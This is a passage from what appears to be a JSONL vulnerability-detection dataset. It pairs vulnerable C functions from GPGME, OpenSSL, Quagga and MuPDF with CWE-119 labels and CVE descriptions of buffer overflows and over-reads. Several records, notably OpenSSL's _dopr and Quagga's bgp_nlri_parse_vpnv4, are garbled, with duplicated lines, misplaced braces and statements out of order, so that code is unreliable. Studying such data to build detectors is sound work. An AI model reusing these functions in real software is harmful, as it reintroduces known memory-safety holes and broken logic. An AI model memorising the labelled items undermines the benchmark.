: \"ok\");\n\t  _gpgme_io_close (gpgsm->status_cb.fd);\n\t  return err;\n\t}\n      else if (linelen > 2\n\t       && line[0] == 'D' && line[1] == ' '\n\t       && gpgsm->colon.fnc)\n        {\n\t  /* We are using the colon handler even for plain inline data\n             - strange name for that function but for historic reasons\n             we keep it.  */\n          /* FIXME We can't use this for binary data because we\n             assume this is a string.  For the current usage of colon\n             output it is correct.  */\n          char *src = line + 2;\n\t  char *end = line + linelen;\n\t  char *dst;\n          char **aline = &gpgsm->colon.attic.line;\n\t  int *alinelen = &gpgsm->colon.attic.linelen;\n\n\t  if (gpgsm->colon.attic.linesize < *alinelen + linelen + 1)\n\t    {\n\t      char *newline = realloc (*aline, *alinelen + linelen + 1);\n\t      if (!newline)\n\t\terr = gpg_error_from_syserror ();\n              else\n                {\n                  *aline = newline;\n                 gpgsm->colon.attic.linesize += linelen + 1;\n                }\n            }\n          if (!err)\n\t    {\n\t      dst = *aline + *alinelen;\n\n\t      while (!err && src < end)\n\t\t{\n\t\t  if (*src == '%' && src + 2 < end)\n\t\t    {\n\t\t      /* Handle escaped characters.  */\n\t\t      ++src;\n\t\t      *dst = _gpgme_hextobyte (src);\n\t\t      (*alinelen)++;\n\t\t      src += 2;\n\t\t    }\n\t\t  else\n\t\t    {\n\t\t      *dst = *src++;\n\t\t      (*alinelen)++;\n\t\t    }\n\n\t\t  if (*dst == '\\n')\n\t\t    {\n\t\t      /* Terminate the pending line, pass it to the colon\n\t\t\t handler and reset it.  */\n\n\t\t      gpgsm->colon.any = 1;\n\t\t      if (*alinelen > 1 && *(dst - 1) == '\\r')\n\t\t\tdst--;\n\t\t      *dst = '\\0';\n\n\t\t      /* FIXME How should we handle the return code?  */\n\t\t      err = gpgsm->colon.fnc (gpgsm->colon.fnc_value, *aline);\n\t\t      if (!err)\n\t\t\t{\n\t\t\t  dst = *aline;\n\t\t\t  *alinelen = 0;\n\t\t\t}\n\t\t    }\n\t\t  else\n\t\t    dst++;\n\t\t}\n\t    }\n          TRACE2 (DEBUG_CTX, \"gpgme:status_handler\", gpgsm,\n\t\t  \"fd 0x%x: D line; final status: %s\",\n                  fd, err? gpg_strerror (err):\"ok\");\n        }\n      else if (linelen > 2\n\t       && line[0] == 'D' && line[1] == ' '\n\t       && gpgsm->inline_data)\n        {\n          char *src = line + 2;\n\t  char *end = line + linelen;\n\t  char *dst = src;\n          gpgme_ssize_t nwritten;\n\n          linelen = 0;\n          while (src < end)\n            {\n              if (*src == '%' && src + 2 < end)\n                {\n                  /* Handle escaped characters.  */\n                  ++src;\n                  *dst++ = _gpgme_hextobyte (src);\n                  src += 2;\n                }\n              else\n                *dst++ = *src++;\n\n              linelen++;\n            }\n\n          src = line + 2;\n          while (linelen > 0)\n            {\n              nwritten = gpgme_data_write (gpgsm->inline_data, src, linelen);\n              if (!nwritten || (nwritten < 0 && errno != EINTR)\n                  || nwritten > linelen)\n                {\n                  err = gpg_error_from_syserror ();\n                  break;\n                }\n              src += nwritten;\n              linelen -= nwritten;\n            }\n\n          TRACE2 (DEBUG_CTX, \"gpgme:status_handler\", gpgsm,\n\t\t  \"fd 0x%x: D inlinedata; final status: %s\",\n                  fd, err? gpg_strerror (err):\"ok\");\n        }\n      else if (linelen > 2\n\t       && line[0] == 'S' && line[1] == ' ')\n\t{\n\t  char *rest;\n\t  gpgme_status_code_t r;\n\n\t  rest = strchr (line + 2, ' ');\n\t  if (!rest)\n\t    rest = line + linelen; /* set to an empty string */\n\t  else\n\t    *(rest++) = 0;\n\n\t  r = _gpgme_parse_status (line + 2);\n\n\t  if (r >= 0)\n\t    {\n\t      if (gpgsm->status.fnc)\n\t\terr = gpgsm->status.fnc (gpgsm->status.fnc_value, r, rest);\n\t    }\n\t  else\n\t    fprintf (stderr, \"[UNKNOWN STATUS]%s %s\", line + 2, rest);\n          TRACE3 (DEBUG_CTX, \"gpgme:status_handler\", gpgsm,\n\t\t  \"fd 0x%x: S line (%s) - final status: %s\",\n                  fd, line+2, err? gpg_strerror (err):\"ok\");\n\t}\n      else if (linelen >= 7\n               && line[0] == 'I' && line[1] == 'N' && line[2] == 'Q'\n               && line[3] == 'U' && line[4] == 'I' && line[5] == 'R'\n               && line[6] == 'E'\n               && (line[7] == '\\0' || line[7] == ' '))\n        {\n          char *keyword = line+7;\n\n          while (*keyword == ' ')\n            keyword++;;\n          default_inq_cb (gpgsm, keyword);\n          assuan_write_line (gpgsm->assuan_ctx, \"END\");\n        }\n\n    }\n  while (!err && assuan_pending_line (gpgsm->assuan_ctx));\n\n  return err;\n}\n", "func_hash": 7203629874001971214417650726602123623, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2014-3564", "cve_desc": "Multiple heap-based buffer overflows in the status_handler function in (1) engine-gpgsm.c and (2) engine-uiserver.c in GPGME before 1.5.1 allow remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via vectors related to \"different line lengths in a specific order.\"", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3564"}
{"idx": 355, "project": "gnupg", "commit_id": "2cbd76f7911fc215845e89b50d6af5ff4a83dd77", "project_url": "http://git.gnupg.org/cgi-bin/gitweb.cgi?p=gnupg", "commit_url": "https://git.gnupg.org/cgi-bin/gitweb.cgi?p=gpgme.git;a=commit;h=2cbd76f7911fc215845e89b50d6af5ff4a83dd77", "commit_message": "None", "target": 1, "func": "status_handler (void *opaque, int fd)\n{\n  struct io_cb_data *data = (struct io_cb_data *) opaque;\n  engine_uiserver_t uiserver = (engine_uiserver_t) data->handler_value;\n  gpgme_error_t err = 0;\n  char *line;\n  size_t linelen;\n\n  do\n    {\n      err = assuan_read_line (uiserver->assuan_ctx, &line, &linelen);\n      if (err)\n\t{\n\t  /* Try our best to terminate the connection friendly.  */\n\t  /*\t  assuan_write_line (uiserver->assuan_ctx, \"BYE\"); */\n          TRACE3 (DEBUG_CTX, \"gpgme:status_handler\", uiserver,\n\t\t  \"fd 0x%x: error from assuan (%d) getting status line : %s\",\n                  fd, err, gpg_strerror (err));\n\t}\n      else if (linelen >= 3\n\t       && line[0] == 'E' && line[1] == 'R' && line[2] == 'R'\n\t       && (line[3] == '\\0' || line[3] == ' '))\n\t{\n\t  if (line[3] == ' ')\n\t    err = atoi (&line[4]);\n\t  if (! err)\n\t    err = gpg_error (GPG_ERR_GENERAL);\n          TRACE2 (DEBUG_CTX, \"gpgme:status_handler\", uiserver,\n\t\t  \"fd 0x%x: ERR line - mapped to: %s\",\n                  fd, err ? gpg_strerror (err) : \"ok\");\n\t  /* Try our best to terminate the connection friendly.  */\n\t  /*\t  assuan_write_line (uiserver->assuan_ctx, \"BYE\"); */\n\t}\n      else if (linelen >= 2\n\t       && line[0] == 'O' && line[1] == 'K'\n\t       && (line[2] == '\\0' || line[2] == ' '))\n\t{\n\t  if (uiserver->status.fnc)\n\t    err = uiserver->status.fnc (uiserver->status.fnc_value,\n\t\t\t\t     GPGME_STATUS_EOF, \"\");\n\n\t  if (!err && uiserver->colon.fnc && uiserver->colon.any)\n            {\n              /* We must tell a colon function about the EOF. We do\n                 this only when we have seen any data lines.  Note\n                 that this inlined use of colon data lines will\n                 eventually be changed into using a regular data\n                 channel. */\n              uiserver->colon.any = 0;\n              err = uiserver->colon.fnc (uiserver->colon.fnc_value, NULL);\n            }\n          TRACE2 (DEBUG_CTX, \"gpgme:status_handler\", uiserver,\n\t\t  \"fd 0x%x: OK line - final status: %s\",\n                  fd, err ? gpg_strerror (err) : \"ok\");\n\t  _gpgme_io_close (uiserver->status_cb.fd);\n\t  return err;\n\t}\n      else if (linelen > 2\n\t       && line[0] == 'D' && line[1] == ' '\n\t       && uiserver->colon.fnc)\n        {\n\t  /* We are using the colon handler even for plain inline data\n             - strange name for that function but for historic reasons\n             we keep it.  */\n          /* FIXME We can't use this for binary data because we\n             assume this is a string.  For the current usage of colon\n             output it is correct.  */\n          char *src = line + 2;\n\t  char *end = line + linelen;\n\t  char *dst;\n          char **aline = &uiserver->colon.attic.line;\n\t  int *alinelen = &uiserver->colon.attic.linelen;\n\n\t  if (uiserver->colon.attic.linesize < *alinelen + linelen + 1)\n\t    {\n\t      char *newline = realloc (*aline, *alinelen + linelen + 1);\n\t      if (!newline)\n\t\terr = gpg_error_from_syserror ();\n              else\n                {\n                  *aline = newline;\n                 uiserver->colon.attic.linesize += linelen + 1;\n                }\n            }\n          if (!err)\n\t    {\n\t      dst = *aline + *alinelen;\n\n\t      while (!err && src < end)\n\t\t{\n\t\t  if (*src == '%' && src + 2 < end)\n\t\t    {\n\t\t      /* Handle escaped characters.  */\n\t\t      ++src;\n\t\t      *dst = _gpgme_hextobyte (src);\n\t\t      (*alinelen)++;\n\t\t      src += 2;\n\t\t    }\n\t\t  else\n\t\t    {\n\t\t      *dst = *src++;\n\t\t      (*alinelen)++;\n\t\t    }\n\n\t\t  if (*dst == '\\n')\n\t\t    {\n\t\t      /* Terminate the pending line, pass it to the colon\n\t\t\t handler and reset it.  */\n\n\t\t      uiserver->colon.any = 1;\n\t\t      if (*alinelen > 1 && *(dst - 1) == '\\r')\n\t\t\tdst--;\n\t\t      *dst = '\\0';\n\n\t\t      /* FIXME How should we handle the return code?  */\n\t\t      err = uiserver->colon.fnc (uiserver->colon.fnc_value, *aline);\n\t\t      if (!err)\n\t\t\t{\n\t\t\t  dst = *aline;\n\t\t\t  *alinelen = 0;\n\t\t\t}\n\t\t    }\n\t\t  else\n\t\t    dst++;\n\t\t}\n\t    }\n          TRACE2 (DEBUG_CTX, \"gpgme:status_handler\", uiserver,\n\t\t  \"fd 0x%x: D line; final status: %s\",\n                  fd, err? gpg_strerror (err):\"ok\");\n        }\n      else if (linelen > 2\n\t       && line[0] == 'D' && line[1] == ' '\n\t       && uiserver->inline_data)\n        {\n          char *src = line + 2;\n\t  char *end = line + linelen;\n\t  char *dst = src;\n          gpgme_ssize_t nwritten;\n\n          linelen = 0;\n          while (src < end)\n            {\n              if (*src == '%' && src + 2 < end)\n                {\n                  /* Handle escaped characters.  */\n                  ++src;\n                  *dst++ = _gpgme_hextobyte (src);\n                  src += 2;\n                }\n              else\n                *dst++ = *src++;\n\n              linelen++;\n            }\n\n          src = line + 2;\n          while (linelen > 0)\n            {\n              nwritten = gpgme_data_write (uiserver->inline_data, src, linelen);\n              if (!nwritten || (nwritten < 0 && errno != EINTR)\n                  || nwritten > linelen)\n                {\n                  err = gpg_error_from_syserror ();\n                  break;\n                }\n              src += nwritten;\n              linelen -= nwritten;\n            }\n\n          TRACE2 (DEBUG_CTX, \"gpgme:status_handler\", uiserver,\n\t\t  \"fd 0x%x: D inlinedata; final status: %s\",\n                  fd, err? gpg_strerror (err):\"ok\");\n        }\n      else if (linelen > 2\n\t       && line[0] == 'S' && line[1] == ' ')\n\t{\n\t  char *rest;\n\t  gpgme_status_code_t r;\n\n\t  rest = strchr (line + 2, ' ');\n\t  if (!rest)\n\t    rest = line + linelen; /* set to an empty string */\n\t  else\n\t    *(rest++) = 0;\n\n\t  r = _gpgme_parse_status (line + 2);\n\n\t  if (r >= 0)\n\t    {\n\t      if (uiserver->status.fnc)\n\t\terr = uiserver->status.fnc (uiserver->status.fnc_value, r, rest);\n\t    }\n\t  else\n\t    fprintf (stderr, \"[UNKNOWN STATUS]%s %s\", line + 2, rest);\n          TRACE3 (DEBUG_CTX, \"gpgme:status_handler\", uiserver,\n\t\t  \"fd 0x%x: S line (%s) - final status: %s\",\n                  fd, line+2, err? gpg_strerror (err):\"ok\");\n\t}\n      else if (linelen >= 7\n               && line[0] == 'I' && line[1] == 'N' && line[2] == 'Q'\n               && line[3] == 'U' && line[4] == 'I' && line[5] == 'R'\n               && line[6] == 'E'\n               && (line[7] == '\\0' || line[7] == ' '))\n        {\n          char *keyword = line+7;\n\n          while (*keyword == ' ')\n            keyword++;;\n          default_inq_cb (uiserver, keyword);\n          assuan_write_line (uiserver->assuan_ctx, \"END\");\n        }\n\n    }\n  while (!err && assuan_pending_line (uiserver->assuan_ctx));\n\n  return err;\n}\n", "func_hash": 77372948009689993078192342243939039842, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2014-3564", "cve_desc": "Multiple heap-based buffer overflows in the status_handler function in (1) engine-gpgsm.c and (2) engine-uiserver.c in GPGME before 1.5.1 allow remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via vectors related to \"different line lengths in a specific order.\"", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3564"}
{"idx": 367, "project": "openssl", "commit_id": "578b956fe741bf8e84055547b1e83c28dd902c73", "project_url": "https://github.com/openssl/openssl", "commit_url": "https://git.openssl.org/?p=openssl.git;a=commit;h=578b956fe741bf8e84055547b1e83c28dd902c73", "commit_message": "Fix memory issues in BIO_*printf functions\n\nThe internal |fmtstr| function used in processing a \"%s\" format string\nin the BIO_*printf functions could overflow while calculating the length\nof a string and cause an OOB read when printing very long strings.\n\nAdditionally the internal |doapr_outch| function can attempt to write to\nan OOB memory location (at an offset from the NULL pointer) in the event of\na memory allocation failure. In 1.0.2 and below this could be caused where\nthe size of a buffer to be allocated is greater than INT_MAX. E.g. this\ncould be in processing a very long \"%s\" format string. Memory leaks can also\noccur.\n\nThese issues will only occur on certain platforms where sizeof(size_t) >\nsizeof(int). E.g. many 64 bit systems. The first issue may mask the second\nissue dependent on compiler behaviour.\n\nThese problems could enable attacks where large amounts of untrusted data\nis passed to the BIO_*printf functions. If applications use these functions\nin this way then they could be vulnerable. OpenSSL itself uses these\nfunctions when printing out human-readable dumps of ASN.1 data. Therefore\napplications that print this data could be vulnerable if the data is from\nuntrusted sources. OpenSSL command line applications could also be\nvulnerable where they print out ASN.1 data, or if untrusted data is passed\nas command line arguments.\n\nLibssl is not considered directly vulnerable. Additionally certificates etc\nreceived via remote connections via libssl are also unlikely to be able to\ntrigger these issues because of message size limits enforced within libssl.\n\nCVE-2016-0799\n\nIssue reported by Guido Vranken.\n\nReviewed-by: Andy Polyakov <appro@openssl.org>", "target": 1, "func": " _dopr(char **sbuffer,\n       char **buffer,\n       size_t *maxlen,\n      size_t *retlen, int *truncated, const char *format, va_list args)\n{\n    char ch;\n    LLONG value;\n    LDOUBLE fvalue;\n    char *strvalue;\n    int min;\n    int max;\n    int state;\n    int flags;\n    int cflags;\n    size_t currlen;\n\n    state = DP_S_DEFAULT;\n    flags = currlen = cflags = min = 0;\n    max = -1;\n    ch = *format++;\n\n    while (state != DP_S_DONE) {\n        if (ch == '\\0' || (buffer == NULL && currlen >= *maxlen))\n            state = DP_S_DONE;\n\n        switch (state) {\n        case DP_S_DEFAULT:\n             if (ch == '%')\n                 state = DP_S_FLAGS;\n             else\n                doapr_outch(sbuffer, buffer, &currlen, maxlen, ch);\n             ch = *format++;\n             break;\n         case DP_S_FLAGS:\n            case '-':\n                flags |= DP_F_MINUS;\n                ch = *format++;\n                break;\n            case '+':\n                flags |= DP_F_PLUS;\n                ch = *format++;\n                break;\n            case ' ':\n                flags |= DP_F_SPACE;\n                ch = *format++;\n                break;\n            case '#':\n                flags |= DP_F_NUM;\n                ch = *format++;\n                break;\n            case '0':\n                flags |= DP_F_ZERO;\n                ch = *format++;\n                break;\n            default:\n                state = DP_S_MIN;\n                break;\n            }\n            break;\n        case DP_S_MIN:\n            if (isdigit((unsigned char)ch)) {\n                min = 10 * min + char_to_int(ch);\n                ch = *format++;\n            } else if (ch == '*') {\n                min = va_arg(args, int);\n                ch = *format++;\n                state = DP_S_DOT;\n            } else\n                state = DP_S_DOT;\n            break;\n        case DP_S_DOT:\n            if (ch == '.') {\n                state = DP_S_MAX;\n                ch = *format++;\n            } else\n                state = DP_S_MOD;\n            break;\n        case DP_S_MAX:\n            if (isdigit((unsigned char)ch)) {\n                if (max < 0)\n                    max = 0;\n                max = 10 * max + char_to_int(ch);\n                ch = *format++;\n            } else if (ch == '*') {\n                max = va_arg(args, int);\n                ch = *format++;\n                state = DP_S_MOD;\n            } else\n                state = DP_S_MOD;\n            break;\n        case DP_S_MOD:\n            switch (ch) {\n            case 'h':\n                cflags = DP_C_SHORT;\n                ch = *format++;\n                break;\n            case 'l':\n                if (*format == 'l') {\n                    cflags = DP_C_LLONG;\n                    format++;\n                } else\n                    cflags = DP_C_LONG;\n                ch = *format++;\n                break;\n            case 'q':\n                cflags = DP_C_LLONG;\n                ch = *format++;\n                break;\n            case 'L':\n                cflags = DP_C_LDOUBLE;\n                ch = *format++;\n                break;\n            default:\n                break;\n            }\n            state = DP_S_CONV;\n            break;\n        case DP_S_CONV:\n            switch (ch) {\n            case 'd':\n            case 'i':\n                switch (cflags) {\n                case DP_C_SHORT:\n                    value = (short int)va_arg(args, int);\n                    break;\n                case DP_C_LONG:\n                    value = va_arg(args, long int);\n                    break;\n                case DP_C_LLONG:\n                    value = va_arg(args, LLONG);\n                    break;\n                default:\n                    value = va_arg(args, int);\n                     value = va_arg(args, int);\n                     break;\n                 }\n                fmtint(sbuffer, buffer, &currlen, maxlen,\n                       value, 10, min, max, flags);\n                 break;\n             case 'X':\n                 flags |= DP_F_UP;\n            case 'o':\n            case 'u':\n                flags |= DP_F_UNSIGNED;\n                switch (cflags) {\n                case DP_C_SHORT:\n                    value = (unsigned short int)va_arg(args, unsigned int);\n                    break;\n                case DP_C_LONG:\n                    value = (LLONG) va_arg(args, unsigned long int);\n                    break;\n                case DP_C_LLONG:\n                    value = va_arg(args, unsigned LLONG);\n                    break;\n                default:\n                    value = (LLONG) va_arg(args, unsigned int);\n                    break;\n                     value = (LLONG) va_arg(args, unsigned int);\n                     break;\n                 }\n                fmtint(sbuffer, buffer, &currlen, maxlen, value,\n                       ch == 'o' ? 8 : (ch == 'u' ? 10 : 16),\n                       min, max, flags);\n                 break;\n             case 'f':\n                 if (cflags == DP_C_LDOUBLE)\n                     fvalue = va_arg(args, LDOUBLE);\n                 else\n                     fvalue = va_arg(args, double);\n                fmtfp(sbuffer, buffer, &currlen, maxlen,\n                      fvalue, min, max, flags);\n                 break;\n             case 'E':\n                 flags |= DP_F_UP;\n                    fvalue = va_arg(args, double);\n                break;\n            case 'G':\n                flags |= DP_F_UP;\n            case 'g':\n                if (cflags == DP_C_LDOUBLE)\n                    fvalue = va_arg(args, LDOUBLE);\n                else\n                    fvalue = va_arg(args, double);\n                break;\n            case 'c':\n                doapr_outch(sbuffer, buffer, &currlen, maxlen,\n                     fvalue = va_arg(args, double);\n                 break;\n             case 'c':\n                doapr_outch(sbuffer, buffer, &currlen, maxlen,\n                            va_arg(args, int));\n                 break;\n             case 's':\n                 strvalue = va_arg(args, char *);\n                }\n                fmtstr(sbuffer, buffer, &currlen, maxlen, strvalue,\n                       flags, min, max);\n                     else\n                         max = *maxlen;\n                 }\n                fmtstr(sbuffer, buffer, &currlen, maxlen, strvalue,\n                       flags, min, max);\n                 break;\n             case 'p':\n                 value = (long)va_arg(args, void *);\n                fmtint(sbuffer, buffer, &currlen, maxlen,\n                       value, 16, min, max, flags | DP_F_NUM);\n                 break;\n             case 'n':          /* XXX */\n                 if (cflags == DP_C_SHORT) {\n                } else if (cflags == DP_C_LLONG) { /* XXX */\n                    LLONG *num;\n                    num = va_arg(args, LLONG *);\n                    *num = (LLONG) currlen;\n                } else {\n                    int *num;\n                    num = va_arg(args, int *);\n                    *num = currlen;\n                }\n                break;\n            case '%':\n                doapr_outch(sbuffer, buffer, &currlen, maxlen, ch);\n                break;\n            case 'w':\n                /* not supported yet, treat as next char */\n                 }\n", "func_hash": 309192226193988062421957531577393101030, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2016-2842", "cve_desc": "The doapr_outch function in crypto/bio/b_print.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g does not verify that a certain memory allocation succeeds, which allows remote attackers to cause a denial of service (out-of-bounds write or memory consumption) or possibly have unspecified other impact via a long string, as demonstrated by a large amount of ASN.1 data, a different vulnerability than CVE-2016-0799.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2842"}
{"idx": 368, "project": "savannah", "commit_id": "a3bc7e9400b214a0f078fdb19596ba54214a1442", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/quagga.git/commit/?id=a3bc7e9400b214a0f078fdb19596ba54214a1442", "commit_message": "None", "target": 1, "func": "bgp_nlri_parse_vpnv4 (struct peer *peer, struct attr *attr, \n\t\t      struct bgp_nlri *packet)\n{\n  u_char *pnt;\n  u_char *lim;\n  struct prefix p;\n  int psize;\n  int prefixlen;\n  u_int16_t type;\n  struct rd_as rd_as;\n  struct rd_ip rd_ip;\n  struct prefix_rd prd;\n  u_char *tagpnt;\n\n  /* Check peer status. */\n  if (peer->status != Established)\n    return 0;\n  \n  /* Make prefix_rd */\n  prd.family = AF_UNSPEC;\n  prd.prefixlen = 64;\n\n   pnt = packet->nlri;\n   lim = pnt + packet->length;\n \n   for (; pnt < lim; pnt += psize)\n     {\n       /* Clear prefix structure. */\n\n \n       /* Fetch prefix length. */\n       prefixlen = *pnt++;\n      p.family = AF_INET;\n       psize = PSIZE (prefixlen);\n      if (prefixlen < 88)\n\t{\n\t  zlog_err (\"prefix length is less than 88: %d\", prefixlen);\n\t  return -1;\n\t}\n       /* Copyr label to prefix. */\n      tagpnt = pnt;;\n \n       /* Copy routing distinguisher to rd. */\n       memcpy (&prd.val, pnt + 3, 8);\n      else if (type == RD_TYPE_IP)\n\tzlog_info (\"prefix %ld:%s:%ld:%s/%d\", label, inet_ntoa (rd_ip.ip),\n\t\t   rd_ip.val, inet_ntoa (p.u.prefix4), p.prefixlen);\n#endif /* 0 */\n\n      if (pnt + psize > lim)\n\treturn -1;\n\n      if (attr)\n\tbgp_update (peer, &p, attr, AFI_IP, SAFI_MPLS_VPN,\n\t\t    ZEBRA_ROUTE_BGP, BGP_ROUTE_NORMAL, &prd, tagpnt, 0);\n      else\n \t  return -1;\n \t}\n \n      p.prefixlen = prefixlen - 88;\n      memcpy (&p.u.prefix, pnt + 11, psize - 11);\n \n #if 0\n       if (type == RD_TYPE_AS)\n}\n", "func_hash": 189301502052689275853315045175183465473, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2016-2342", "cve_desc": "The bgp_nlri_parse_vpnv4 function in bgp_mplsvpn.c in the VPNv4 NLRI parser in bgpd in Quagga before 1.0.20160309, when a certain VPNv4 configuration is used, relies on a Labeled-VPN SAFI routes-data length field during a data copy, which allows remote attackers to execute arbitrary code or cause a denial of service (stack-based buffer overflow) via a crafted packet.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2342"}
{"idx": 383, "project": "openssl", "commit_id": "2919516136a4227d9e6d8f2fe66ef976aaf8c561", "project_url": "https://github.com/openssl/openssl", "commit_url": "https://git.openssl.org/?p=openssl.git;a=commitdiff;h=2919516136a4227d9e6d8f2fe66ef976aaf8c561", "commit_message": "Prevent EBCDIC overread for very long strings\n\nASN1 Strings that are over 1024 bytes can cause an overread in\napplications using the X509_NAME_oneline() function on EBCDIC systems.\nThis could result in arbitrary stack data being returned in the buffer.\n\nIssue reported by Guido Vranken.\n\nCVE-2016-2176\n\nReviewed-by: Andy Polyakov <appro@openssl.org>", "target": 1, "func": "char *X509_NAME_oneline(X509_NAME *a, char *buf, int len)\n{\n    X509_NAME_ENTRY *ne;\n    int i;\n    int n, lold, l, l1, l2, num, j, type;\n    const char *s;\n    char *p;\n    unsigned char *q;\n    BUF_MEM *b = NULL;\n    static const char hex[17] = \"0123456789ABCDEF\";\n    int gs_doit[4];\n    char tmp_buf[80];\n#ifdef CHARSET_EBCDIC\n    char ebcdic_buf[1024];\n#endif\n\n    if (buf == NULL) {\n        if ((b = BUF_MEM_new()) == NULL)\n            goto err;\n        if (!BUF_MEM_grow(b, 200))\n            goto err;\n        b->data[0] = '\\0';\n        len = 200;\n    } else if (len == 0) {\n        return NULL;\n    }\n    if (a == NULL) {\n        if (b) {\n            buf = b->data;\n            OPENSSL_free(b);\n        }\n        strncpy(buf, \"NO X509_NAME\", len);\n        buf[len - 1] = '\\0';\n        return buf;\n    }\n\n    len--;                      /* space for '\\0' */\n    l = 0;\n    for (i = 0; i < sk_X509_NAME_ENTRY_num(a->entries); i++) {\n        ne = sk_X509_NAME_ENTRY_value(a->entries, i);\n        n = OBJ_obj2nid(ne->object);\n        if ((n == NID_undef) || ((s = OBJ_nid2sn(n)) == NULL)) {\n            i2t_ASN1_OBJECT(tmp_buf, sizeof(tmp_buf), ne->object);\n            s = tmp_buf;\n        }\n        l1 = strlen(s);\n\n        type = ne->value->type;\n        num = ne->value->length;\n        if (num > NAME_ONELINE_MAX) {\n            X509err(X509_F_X509_NAME_ONELINE, X509_R_NAME_TOO_LONG);\n            goto end;\n        }\n        q = ne->value->data;\n#ifdef CHARSET_EBCDIC\n        if (type == V_ASN1_GENERALSTRING ||\n            type == V_ASN1_VISIBLESTRING ||\n             type == V_ASN1_PRINTABLESTRING ||\n             type == V_ASN1_TELETEXSTRING ||\n             type == V_ASN1_VISIBLESTRING || type == V_ASN1_IA5STRING) {\n            ascii2ebcdic(ebcdic_buf, q, (num > sizeof ebcdic_buf)\n                         ? sizeof ebcdic_buf : num);\n             q = ebcdic_buf;\n         }\n #endif\n        if ((type == V_ASN1_GENERALSTRING) && ((num % 4) == 0)) {\n            gs_doit[0] = gs_doit[1] = gs_doit[2] = gs_doit[3] = 0;\n            for (j = 0; j < num; j++)\n                if (q[j] != 0)\n                    gs_doit[j & 3] = 1;\n\n            if (gs_doit[0] | gs_doit[1] | gs_doit[2])\n                gs_doit[0] = gs_doit[1] = gs_doit[2] = gs_doit[3] = 1;\n            else {\n                gs_doit[0] = gs_doit[1] = gs_doit[2] = 0;\n                gs_doit[3] = 1;\n            }\n        } else\n            gs_doit[0] = gs_doit[1] = gs_doit[2] = gs_doit[3] = 1;\n\n        for (l2 = j = 0; j < num; j++) {\n            if (!gs_doit[j & 3])\n                continue;\n            l2++;\n#ifndef CHARSET_EBCDIC\n            if ((q[j] < ' ') || (q[j] > '~'))\n                l2 += 3;\n#else\n            if ((os_toascii[q[j]] < os_toascii[' ']) ||\n                (os_toascii[q[j]] > os_toascii['~']))\n                l2 += 3;\n#endif\n        }\n\n        lold = l;\n        l += 1 + l1 + 1 + l2;\n        if (l > NAME_ONELINE_MAX) {\n            X509err(X509_F_X509_NAME_ONELINE, X509_R_NAME_TOO_LONG);\n            goto end;\n        }\n        if (b != NULL) {\n            if (!BUF_MEM_grow(b, l + 1))\n                goto err;\n            p = &(b->data[lold]);\n        } else if (l > len) {\n            break;\n        } else\n            p = &(buf[lold]);\n        *(p++) = '/';\n        memcpy(p, s, (unsigned int)l1);\n        p += l1;\n        *(p++) = '=';\n\n#ifndef CHARSET_EBCDIC          /* q was assigned above already. */\n        q = ne->value->data;\n#endif\n\n        for (j = 0; j < num; j++) {\n            if (!gs_doit[j & 3])\n                continue;\n#ifndef CHARSET_EBCDIC\n            n = q[j];\n            if ((n < ' ') || (n > '~')) {\n                *(p++) = '\\\\';\n                *(p++) = 'x';\n                *(p++) = hex[(n >> 4) & 0x0f];\n                *(p++) = hex[n & 0x0f];\n            } else\n                *(p++) = n;\n#else\n            n = os_toascii[q[j]];\n            if ((n < os_toascii[' ']) || (n > os_toascii['~'])) {\n                *(p++) = '\\\\';\n                *(p++) = 'x';\n                *(p++) = hex[(n >> 4) & 0x0f];\n                *(p++) = hex[n & 0x0f];\n            } else\n                *(p++) = q[j];\n#endif\n        }\n        *p = '\\0';\n    }\n    if (b != NULL) {\n        p = b->data;\n        OPENSSL_free(b);\n    } else\n        p = buf;\n    if (i == 0)\n        *p = '\\0';\n    return (p);\n err:\n    X509err(X509_F_X509_NAME_ONELINE, ERR_R_MALLOC_FAILURE);\n end:\n    BUF_MEM_free(b);\n    return (NULL);\n}\n", "func_hash": 92428507097973547653884047469651088423, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2016-2176", "cve_desc": "The X509_NAME_oneline function in crypto/x509/x509_obj.c in OpenSSL before 1.0.1t and 1.0.2 before 1.0.2h allows remote attackers to obtain sensitive information from process stack memory or cause a denial of service (buffer over-read) via crafted EBCDIC ASN.1 data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2176"}
{"idx": 398, "project": "ghostscript", "commit_id": "60dabde18d7fe12b19da8b509bdfee9cc886aafc", "project_url": "http://git.ghostscript.com/?p=mupdf", "commit_url": "http://git.ghostscript.com/?p=mupdf.git;a=commitdiff;h=60dabde18d7fe12b19da8b509bdfee9cc886aafc", "commit_message": "None", "target": 1, "func": " xps_parse_color(xps_document *doc, char *base_uri, char *string,\n                fz_colorspace **csp, float *samples)\n {\n        char *p;\n        int i, n;\n        char buf[1024];\n        char *profile;\n \n       *csp = fz_device_rgb(doc->ctx);\n \n        samples[0] = 1;\n        samples[1] = 0;\n\tsamples[3] = 0;\n\n\tif (string[0] == '#')\n\t{\n\t\tif (strlen(string) == 9)\n\t\t{\n\t\t\tsamples[0] = unhex(string[1]) * 16 + unhex(string[2]);\n\t\t\tsamples[1] = unhex(string[3]) * 16 + unhex(string[4]);\n\t\t\tsamples[2] = unhex(string[5]) * 16 + unhex(string[6]);\n\t\t\tsamples[3] = unhex(string[7]) * 16 + unhex(string[8]);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tsamples[0] = 255;\n\t\t\tsamples[1] = unhex(string[1]) * 16 + unhex(string[2]);\n\t\t\tsamples[2] = unhex(string[3]) * 16 + unhex(string[4]);\n\t\t\tsamples[3] = unhex(string[5]) * 16 + unhex(string[6]);\n\t\t}\n\n\t\tsamples[0] /= 255;\n\t\tsamples[1] /= 